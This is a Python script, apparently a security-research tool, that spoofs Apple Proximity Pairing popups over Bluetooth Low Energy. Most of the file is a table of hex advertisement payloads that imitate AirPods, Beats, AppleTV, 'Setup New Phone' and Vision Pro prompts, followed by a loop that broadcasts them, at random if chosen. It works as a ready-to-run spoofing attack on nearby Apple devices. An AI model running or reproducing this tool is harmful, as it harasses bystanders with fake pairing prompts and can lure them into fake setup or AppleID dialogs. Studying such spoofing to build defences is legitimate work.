# Author: ECTO-1A & SAY-10
# Github: https://github.com/ECTO-1A

# Based on the previous work of chipik / _hexway
import random
import argparse
import bluetooth._bluetooth as bluez
from time import sleep
from utils.bluetooth_utils import toggle_device, start_le_advertising, stop_le_advertising

SLEEP_TIME = 2

# Add a docstring to describe the purpose of the script
help_desc = '''

Apple Proximity Pairing Notification Spoofing

---ECTO-1A August 2023---

Based on the previous work of chipik / _hexway

'''

# Define different bt_data options and their corresponding descriptions
# bt_data_options = {
#     1: "Airpods",
#     2: "Airpods Pro",
#     3: "Airpods Max",
#     4: "Airpods Gen 2",
#     5: "Airpods Gen 3",
#     6: "Airpods Pro Gen 2",
#     7: "PowerBeats",
#     8: "PowerBeats Pro",
#     9: "Beats Solo Pro",
#     10: "Beats Studio Buds",
#     11: "Beats Flex",
#     12: "BeatsX",
#     13: "Beats Solo3",
#     14: "Beats Studio3",
#     15: "Beats Studio Pro",
#     16: "Beats Fit Pro",
#     17: "Beats Studio Buds+",
#     18: "AppleTV Setup",
#     19: "AppleTV Pair",
#     20: "AppleTV New User",
#     21: "AppleTV AppleID Setup",
#     22: "AppleTV Wireless Audio Sync",
#     23: "AppleTV Homekit Setup",
#     24: "AppleTV Keyboard",
#     25: "AppleTV 'Connecting to Network'",
#     26: "Homepod Setup",
#     27: "Setup New Phone",
#     28: "Transfer Number to New Phone",
#     29: "TV Color Balance",
#     30: "Vision Pro"

#     # Add more options as needed
# }


bt_data_options = {
    1: "Airpods",
    2: "Airpods Pro",
    4: "Airpods Gen 2",
    5: "Airpods Gen 3",
    8: "PowerBeats Pro",
    10: "Beats Studio Buds",
    16: "Beats Fit Pro",

    19: "AppleTV Pair",
    20: "AppleTV New User",
    21: "AppleTV AppleID Setup",
    22: "AppleTV Wireless Audio Sync",
    23: "AppleTV Homekit Setup",
    24: "AppleTV Keyboard",
    26: "Homepod Setup",
    27: "Setup New Phone",
    28: "Transfer Number to New Phone",
    29: "TV Color Balance",
    30: "Vision Pro"

    # Add more options as needed
}

# Hex data map
hex_data = {
    1: (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00),
    2: (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0e, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00),
    3: (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0a, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00),
    4: (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0f, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00),
    5: (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x13, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00),
    6: (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x14, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00),
    7: (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x03, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00),
    8: (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0b, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00),
    9: (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0c, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00),
    10: (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x11, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00),
    11: (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x10, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00),
    12: (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x05, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00),
    13: (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x06, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00),
    14: (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x09, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00),
    15: (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x17, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00),
    16: (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x12, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00),
    17: (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x16, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00),
    18: (0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x01, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00),
    19: (0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x06, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00),
    20: (0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x20, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00),
    21: (0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x2b, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00),
    22: (0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0xc0, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00),
    23: (0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x0d, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00),
    24: (0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x13, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00),
    25: (0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x27, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00),
    26: (0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x0b, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00),
    27: (0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x09, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00),
    28: (0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x02, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00),
    29: (0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x1e, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00),
    30: (0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x24, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00)
    # Add More as needed
}


def main():
    parser = argparse.ArgumentParser(
        description=help_desc, formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument('-i', '--interval', default=200,
                        type=int, help='Advertising interval (default 200))')
    parser.add_argument('-d', '--data', type=int,
                        help='Select a message to send (e.g., -d 1)')

    # Add random argument
    parser.add_argument('-r', '--random', action='store_true',
                        help='Randomly loop through advertising data')

    args = parser.parse_args()

    if args.data is None and not args.random:
        print(
            "Please select a message option using -d or use --random for random selection.")
        print("Available message options:")
        for option, description in bt_data_options.items():
            print(f"{option}: {description}")
        return

    if args.data and args.data not in bt_data_options:
        print(f"Invalid data option: {args.data}")
        print("Available data options:")
        for option, description in bt_data_options.items():
            print(f"{option}: {description}")
        return

    # the default Bluetooth device is hci0
    dev_id = 0
    toggle_device(dev_id, True)

    try:
        sock = bluez.hci_open_dev(dev_id)
    except Exception as e:
        print(f"Unable to connect to Bluetooth hardware {dev_id}: {e}")
        return

    print("Advertising Started... Press Ctrl+C to Stop")

    try:
        if args.random:
            while True:
                selected_option = random.choice(list(bt_data_options.keys()))
                print(f"{selected_option},{bt_data_options[selected_option]}")
                bt_data = hex_data.get(selected_option)
                start_le_advertising(
                    sock, adv_type=0x03, min_interval=args.interval, max_interval=args.interval, data=bt_data)
                sleep(SLEEP_TIME)
                stop_le_advertising(sock)
        else:
            selected_option = args.data
            bt_data = hex_data.get(selected_option)
            start_le_advertising(
                sock, adv_type=0x03, min_interval=args.interval, max_interval=args.interval, data=bt_data)
            while True:
                sleep(SLEEP_TIME)
    except KeyboardInterrupt:
        stop_le_advertising(sock)
    except Exception as e:
        print(f"An error occurred: {e}")
        stop_le_advertising(sock)


if __name__ == "__main__":
    main()
